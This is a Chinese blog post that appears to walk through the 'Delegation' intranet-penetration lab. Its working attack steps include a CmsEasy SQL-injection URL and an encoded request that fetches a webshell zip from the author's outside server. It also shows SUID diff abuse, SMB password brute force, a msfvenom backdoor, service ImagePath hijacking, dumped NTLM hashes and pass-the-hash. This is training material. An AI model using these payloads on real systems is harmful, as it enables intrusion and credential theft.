<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Delegation | 仙心</title><meta name="author" content="xianxin"><meta name="copyright" content="xianxin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DelegationDelegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 tagBrute Force、Privilege Elevation、Kerberos、域渗透 信息搜集先用fscan">
<meta property="og:type" content="article">
<meta property="og:title" content="Delegation">
<meta property="og:url" content="https://xianxinyyds.github.io/2025/08/24/Delegation/index.html">
<meta property="og:site_name" content="仙心">
<meta property="og:description" content="DelegationDelegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 tagBrute Force、Privilege Elevation、Kerberos、域渗透 信息搜集先用fscan">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xianxinyyds.github.io/img/xianxin.jpg">
<meta property="article:published_time" content="2025-08-24T15:20:58.000Z">
<meta property="article:modified_time" content="2025-08-30T08:04:02.804Z">
<meta property="article:author" content="xianxin">
<meta property="article:tag" content="渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xianxinyyds.github.io/img/xianxin.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Delegation",
  "url": "https://xianxinyyds.github.io/2025/08/24/Delegation/",
  "image": "https://xianxinyyds.github.io/img/xianxin.jpg",
  "datePublished": "2025-08-24T15:20:58.000Z",
  "dateModified": "2025-08-30T08:04:02.804Z",
  "author": [
    {
      "@type": "Person",
      "name": "xianxin",
      "url": "https://xianxinyyds.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/xianxin.jpg"><link rel="canonical" href="https://xianxinyyds.github.io/2025/08/24/Delegation/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Delegation',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/456.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/147.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/xianxin.jpg" alt="Logo"><span class="site-name">仙心</span></a><a class="nav-page-title" href="/"><span class="site-name">Delegation</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Delegation</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-24T15:20:58.000Z" title="发表于 2025-08-24 23:20:58">2025-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-30T08:04:02.804Z" title="更新于 2025-08-30 16:04:02">2025-08-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><p>Delegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
<h2 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h2><p><code>Brute Force</code>、<code>Privilege Elevation</code>、<code>Kerberos</code>、<code>域渗透</code></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先用fscan扫一下机器<br><code>./fscan.exe -h 39.99.129.242 -nobr</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">39.99.129.242:21 open</span><br><span class="line">39.99.129.242:3306 open</span><br><span class="line">39.99.129.242:22 open</span><br><span class="line">39.99.129.242:80 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.129.242      code:200 len:68108  title:中文网页标题</span><br><span class="line">已完成 4/4</span><br><span class="line">[*] 扫描结束,耗时: 8.6680217s</span><br></pre></td></tr></table></figure>
<h2 id="机器36"><a href="#机器36" class="headerlink" title="机器36"></a>机器36</h2><p>没扫到什么东西，访问网站看看，发现为cmseasy，源代码发现<code>CmsEasy 7_7_5_20210919_UTF8</code>，搜索相关版本漏洞</p>
<blockquote>
<p>CmsEasy crossall_act.php SQL注入漏洞<br>漏洞描述<br>CmsEasy 存在SQL注入漏洞，通过文件 service.php 加密SQL语句执行即可执行任意SQL命令<br>影响版本<br>CmsEasy V7.7.5_20210919</p>
</blockquote>
<p>payload如下<br><code>http://39.99.129.242/?case=crossall&amp;act=execsql&amp;sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5</code><br>成功获取admin用户的密码md5<br><code>&#123;&quot;userid&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;nickname&quot;:&quot;\u7ba1\u7406\u5458&quot;,&quot;groupid&quot;:&quot;2&quot;,&quot;checked&quot;:&quot;1&quot;,&quot;qqlogin&quot;:&quot;&quot;,&quot;alipaylogin&quot;:&quot;&quot;,&quot;wechatlogin&quot;:&quot;&quot;,&quot;avatar&quot;:&quot;&quot;,&quot;userip&quot;:&quot;&quot;,&quot;state&quot;:&quot;0&quot;,&quot;qq&quot;:&quot;1111&quot;,&quot;e_mail&quot;:&quot;admin@admin.com&quot;,&quot;address&quot;:&quot;admin&quot;,&quot;tel&quot;:&quot;admin&quot;,&quot;question&quot;:&quot;&quot;,&quot;answer&quot;:&quot;&quot;,&quot;intro&quot;:&quot;&quot;,&quot;point&quot;:&quot;0&quot;,&quot;introducer&quot;:&quot;0&quot;,&quot;regtime&quot;:&quot;0&quot;,&quot;sex&quot;:&quot;&quot;,&quot;isblock&quot;:&quot;0&quot;,&quot;isdelete&quot;:&quot;0&quot;,&quot;headimage&quot;:&quot;\/html\/upload\/images\/201907\/15625455867367.png&quot;,&quot;integration&quot;:&quot;0&quot;,&quot;couponidnum&quot;:&quot;17:0:1&quot;,&quot;collect&quot;:&quot;2,4,3,46,14,73&quot;,&quot;menoy&quot;:&quot;100.07&quot;,&quot;adddatetime&quot;:&quot;2021-09-01 00:00:00&quot;,&quot;notifiid&quot;:&quot;&quot;,&quot;templatelang&quot;:&quot;cn&quot;,&quot;adminlang&quot;:&quot;cn&quot;,&quot;buyarchive&quot;:&quot;&quot;,&quot;adminlangdomain&quot;:&quot;&quot;,&quot;templatelangdomain&quot;:&quot;&quot;,&quot;expired_time&quot;:&quot;0&quot;&#125;</code><br>利用hashcat爆破<br><code>hashcat -a 0 -m 0 --force hash.txt /usr/share/wordlists/rockyou.txt</code></p>
<blockquote>
<p>-m 0 指定MD5算法</p>
</blockquote>
<p><code>e10adc3949ba59abbe56e057f20f883e:123456</code><br>得到结果为123456，看来这里用弱口令爆破也可以<br>找一下其他可用漏洞</p>
<blockquote>
<p>这个漏洞也可以打，而且更方便<br><a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E">CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞</a></p>
</blockquote>
<p>我用的这个<br><a target="_blank" rel="noopener" href="https://www.saury.net/925.html">CmsEasy update_admin.php 后台任意文件上传漏洞</a></p>
<blockquote>
<p>漏洞描述<br>CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件。<br>影响版本<br>CmsEasy V7.7.5_20210919</p>
</blockquote>
<p>需要先登录进去才能任意文件上传<br>在VPS上起个python内置服务器:<br>把需要下载的文件放在你执行python命令的路径下，然后执行下面的命令<br><code>python3 -m http.server 80</code><br>然后在路径下放一个存有shell.php的shell.zip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function lockString($txt,$key=&#x27;cmseasy_sql&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+&quot;;</span><br><span class="line">        $nh = rand(0,64);</span><br><span class="line">        $ch = $chars[$nh];</span><br><span class="line">        $mdKey = md5($key.$ch);</span><br><span class="line">        $mdKey = substr($mdKey,$nh%8, $nh%8+8);</span><br><span class="line">        $txt = base64_encode($txt);</span><br><span class="line">        $tmp = &#x27;&#x27;;</span><br><span class="line">        $i=0;$j=0;$k = 0;</span><br><span class="line">        for ($i=0; $i&lt;strlen($txt); $i++) &#123;</span><br><span class="line">            $k = $k == strlen($mdKey) ? 0 : $k;</span><br><span class="line">            $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64;</span><br><span class="line">            $tmp .= $chars[$j];</span><br><span class="line">        &#125;</span><br><span class="line">        return urlencode($ch.$tmp);</span><br><span class="line">    &#125;</span><br><span class="line">echo lockString(&#x27;http://118.195.216.57/shell.zip&#x27;,&#x27;cmseasy_url&#x27;);</span><br></pre></td></tr></table></figure>
<p><code>951DS-3dNpg4nvhmjs1IjqBxqBEzl9VvcO0PZ%3DdKIKydh</code><br>构造下载请求<br><code>/index.php?case=update&amp;act=downfile&amp;admin_dir=admin&amp;site=default&amp;url=951DS-3dNpg4nvhmjs1IjqBxqBEzl9VvcO0PZ%3DdKIKydh</code><br>成功上传<br>蚁剑连接shell.php，上传stowaway的agent<br><code>./linux_x64_agent -l 44444 -s 123</code><br><code>./linux_x64_admin -c 39.99.129.242:44444 -s 123</code><br>成功连接，先用stowaway传个fscan上去<br><code>upload /home/kali/Desktop/fscan /tmp/xx/fscan</code><br>挂个代理<br><code>socks 12345</code><br>然后起shell<br><code>shell</code><br><code>ifconfig</code><br><code>./fscan -h 172.22.4.0/24 -nobr</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.4.7      is alive</span><br><span class="line">(icmp) Target 172.22.4.45     is alive</span><br><span class="line">(icmp) Target 172.22.4.36     is alive</span><br><span class="line">(icmp) Target 172.22.4.19     is alive</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">172.22.4.7:88 open</span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.7</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.4.7</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line">   [-&gt;]WIN19</span><br><span class="line">   [-&gt;]172.22.4.45</span><br><span class="line">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.19</span><br><span class="line">   [-&gt;]FILESERVER</span><br><span class="line">   [-&gt;]172.22.4.19</span><br><span class="line">[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题</span><br><span class="line">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure>
<p>172.22.4.7  域控<br>172.22.4.19  FILESERVER<br>172.22.4.36  本机<br>172.22.4.45<br>本机提权<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>
<p>发现diff这个一般不应该被设置的函数<br>找一下flag<br><code>find -name flag*</code><br>找到flag01的位置<br><code>/home/flag/flag01.txt</code><br>然后利用diff进行读取<br><code>echo &gt; /tmp/1.txt</code><br><code>diff ./flag01.txt /tmp/1.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1,7d0</span><br><span class="line">&lt;   ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     </span><br><span class="line">&lt;  |  _&quot;\ \| ___&quot;|/ |&quot;|    \| ___&quot;|/U /&quot;___|uU  /&quot;\  u  |_ &quot; _|     ___     \/&quot;_ \/ | \ |&quot;|    </span><br><span class="line">&lt; /| | | | |  _|&quot; U | | u   |  _|&quot;  \| |  _ / \/ _ \/     | |      |_&quot;_|    | | | |&lt;|  \| |&gt;   </span><br><span class="line">&lt; U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   </span><br><span class="line">&lt;  |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    </span><br><span class="line">&lt;   |||_   &lt;&lt;   &gt;&gt;  //  \\  &lt;&lt;   &gt;&gt;   _)(|_   \\    &gt;&gt;  _// \\_.-,_|___|_,-.  \\    ||   \\,-. </span><br><span class="line">&lt;  (__)_) (__) (__)(_&quot;)(&quot;_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-&#x27; &#x27;-(_/  (__)   (_&quot;)  (_/  </span><br><span class="line">9,15d1</span><br><span class="line">&lt; flag01: flag&#123;5ccf1f2d-e0b0-4609-8aaa-aec4f35064cf&#125;</span><br><span class="line">&lt; </span><br><span class="line">&lt; Great job!!!!!!</span><br><span class="line">&lt; </span><br><span class="line">&lt; Here is the hint: WIN19\Adrian</span><br><span class="line">&lt; </span><br><span class="line">&lt; I&#x27;ll do whatever I can to rock you...</span><br></pre></td></tr></table></figure>
<p>得到flag01以及hint:WIN19\Adrian</p>
<h2 id="机器45"><a href="#机器45" class="headerlink" title="机器45"></a>机器45</h2><p>在windows起个代理想后续用windows远程桌面<br><code>./linux_x64_agent -l 44445 -s 123</code><br><code>./windows_x64_admin.exe -c 39.99.129.242:44445 -s 123</code><br>在45网站iis上也没发现什么可用漏洞<br>尝试利用hint进行密码爆破<br><code>proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</code><br>发现babygirl1回显不一样<br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/ed045bee64a35481145f85a40bfbd78e.png"><br>这里windows远程好像不行<br>用rdesktop连过去看看<br><code>proxychains rdesktop 172.22.4.45</code><br>需要改密码，改成12345678<br><code>proxychains rdesktop 172.22.4.45 -u Adrian -p &#39;12345678&#39; -r disk:mydisk=&quot;./http&quot;</code><br>远程过去桌面上有PrivescCheck漏洞扫描结果<br>直接看high就行<br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755612416692.png"><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755612442720.png"><br>发现可以修改该服务的配置，例如将其执行的镜像路径 (ImagePath) 指向一个恶意的可执行文件。由于该服务以 LocalSystem 权限运行，重启服务后恶意程序将以 SYSTEM 权限执行。<br>配置msf<br><code>msfconsole</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 39.99.129.242</span><br><span class="line">set lport 4567</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>拿下第一个机器<br>然后进行流量转发<br><code>sessions</code><br><code>route add 172.22.4.0/24 1</code><br>然后本地生成一个正向shell的windows的64位后门<br><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=7654 -f exe -o xx.exe</code><br>配置msf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 172.22.4.45</span><br><span class="line">set lport 7654</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>打开 regedit。<br>导航到 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate。<br>修改 ImagePath 值的数据为我们的木马</p>
<blockquote>
<p>也可以用命令行修改注册表<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ImagePath /t REG_EXPAND_SZ /d &quot;C:\Users\Adrian\Desktop\xx.exe&quot;</code></p>
</blockquote>
<p>然后运行更新命令<br><code>sc start gupdate</code><br>这里在命令执行一段时间后进程会被关闭导致断连，这里hashdump出来用smbexec进行进程维持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">qaq:1004:aad3b435b51404eeaad3b435b51404ee:51a52c415264a8fc31520f66f2f50459:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br></pre></td></tr></table></figure>
<p><code>proxychains impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45 -codec gbk</code><br>然后再在命令行里面运行我们的木马进行msf连接<br>然后就可以拿flag02啦</p>
